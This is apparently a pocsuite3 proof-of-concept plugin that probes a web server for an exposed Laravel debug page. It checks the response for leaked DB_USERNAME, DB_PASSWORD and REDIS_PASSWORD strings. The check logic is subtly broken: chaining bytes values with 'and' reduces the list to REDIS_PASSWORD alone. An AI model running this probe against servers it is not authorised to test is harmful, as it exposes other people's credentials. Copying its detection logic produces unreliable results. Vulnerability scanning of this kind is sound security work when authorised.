#!/usr/bin/env python
# -*- coding:utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''laravel_debug_info_leak'''
    desc = ''''''
    severity = '''medium'''
    vulType = '''info-disclosure'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = ''''''
    appVersion = ''''''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        payload_url = make_verify_url(self.url, '/', mod=0)
        resp = requests.get(payload_url, allow_redirects=False, verify=False, timeout=15)
        if all(word in resp.content for word in [b'RouteCollection.php' and b'MethodNotAllowedHttpException' and b'DB_USERNAME' and b'DB_PASSWORD' and b'Environment Variables' and b'REDIS_PASSWORD']) and resp.status_code == 405:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(TestPOC)
